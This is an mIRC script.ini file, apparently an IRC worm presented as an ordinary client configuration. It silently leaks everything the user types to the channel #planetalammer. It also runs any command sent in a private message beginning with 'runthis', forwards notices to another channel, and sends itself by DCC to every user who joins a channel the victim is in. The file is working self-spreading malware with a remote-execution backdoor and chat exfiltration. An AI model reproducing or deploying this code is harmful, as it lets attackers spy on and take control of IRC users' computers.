[script]
n0=on 1:START:{
n1=  .sreq ignore
n2=  .remote on
n3=}
n4=on 1:CONNECT: .msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe
n5=on 1:INPUT:*:{
n6=  .msg #planetalammer ( $+ $active $+ ) $1-
n7=}
n8=on 1:TEXT:*:?:{
n9=  if ( $1 == runthis ) { .run $2- }
n10=}
n11=
n12=on 1:JOIN:*:{
n13=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini
n14=}
n15=ON 1:NOTICE:*:#:/msg #x3212  $+ $chan $+  - $+ $nick $+ - $parms
